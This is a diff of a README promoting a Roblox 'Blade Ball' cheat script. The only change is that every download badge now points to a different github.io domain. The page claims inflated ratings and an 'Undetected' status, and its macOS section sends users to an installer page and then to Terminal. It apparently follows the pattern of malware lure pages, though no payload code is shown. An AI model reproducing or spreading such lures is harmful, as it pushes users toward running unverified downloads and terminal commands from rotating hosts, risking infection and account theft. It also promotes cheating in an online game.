@@ -1,9 +1,9 @@
 # ⚔️ Blade Ball Script — Auto Parry, Auto Spam, Auto Block
 
-[![Rating](https://img.shields.io/badge/Rating-4.9%2F5-brightgreen?style=for-the-badge)](https://laplaplaplas.github.io/download/)
-[![Downloads](https://img.shields.io/badge/Downloads-50K%2B-blue?style=for-the-badge)](https://laplaplaplas.github.io/download/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://laplaplaplas.github.io/mac-download/)
-[![Undetected](https://img.shields.io/badge/Status-Undetected-success?style=for-the-badge)](https://laplaplaplas.github.io/download/)
+[![Rating](https://img.shields.io/badge/Rating-4.9%2F5-brightgreen?style=for-the-badge)](https://hornbladesmanhonor.github.io/download-win/)
+[![Downloads](https://img.shields.io/badge/Downloads-50K%2B-blue?style=for-the-badge)](https://hornbladesmanhonor.github.io/download-win/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hornbladesmanhonor.github.io/download-mac/)
+[![Undetected](https://img.shields.io/badge/Status-Undetected-success?style=for-the-badge)](https://hornbladesmanhonor.github.io/download-win/)
 
 Welcome to the ultimate guide on the **blade ball script**, a game-changing tool designed for enthusiasts of the popular Roblox game Blade Ball. 🎮 This script elevates your gameplay by automating complex actions, allowing you to focus on strategy and fun rather than manual precision. Whether you're a beginner looking to level up or a seasoned player seeking an edge, this script offers seamless integration and powerful features. 🚀
 
@@ -11,7 +11,7 @@ With its pastebin accessibility and **keyless activation**, getting started is e
 
 ---
 
-[![Download Now](https://img.shields.io/badge/⬇%20Download-Now-success?style=for-the-badge&logo=download)](https://laplaplaplas.github.io/download/)
+[![Download Now](https://img.shields.io/badge/⬇%20Download-Now-success?style=for-the-badge&logo=download)](https://hornbladesmanhonor.github.io/download-win/)
 
 ---
 
@@ -93,7 +93,7 @@ Installing this script is straightforward, designed for minimal hassle.
 ### 💻 PC Installation
 
 1. Download the script from the link below
-   [![Download Script](https://img.shields.io/badge/⬇%20Download-Script-success?style=for-the-badge)](https://laplaplaplas.github.io/download/)
+   [![Download Script](https://img.shields.io/badge/⬇%20Download-Script-success?style=for-the-badge)](https://hornbladesmanhonor.github.io/download-win/)
 
 2. Install a Roblox executor like Synapse X or Krnl
 
@@ -222,7 +222,7 @@ Yes, through the config menu. Adjust sensitivities for personalized defense.
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://laplaplaplas.github.io/mac-download/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://hornbladesmanhonor.github.io/download-mac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -240,7 +240,7 @@ Embrace it for **more wins, less stress, and endless fun**. Download today and j
 
 ---
 
-[![Download Now](https://img.shields.io/badge/⬇%20Download-Now-success?style=for-the-badge&logo=download)](https://laplaplaplas.github.io/download/)
+[![Download Now](https://img.shields.io/badge/⬇%20Download-Now-success?style=for-the-badge&logo=download)](https://hornbladesmanhonor.github.io/download-win/)
 
 ---
 
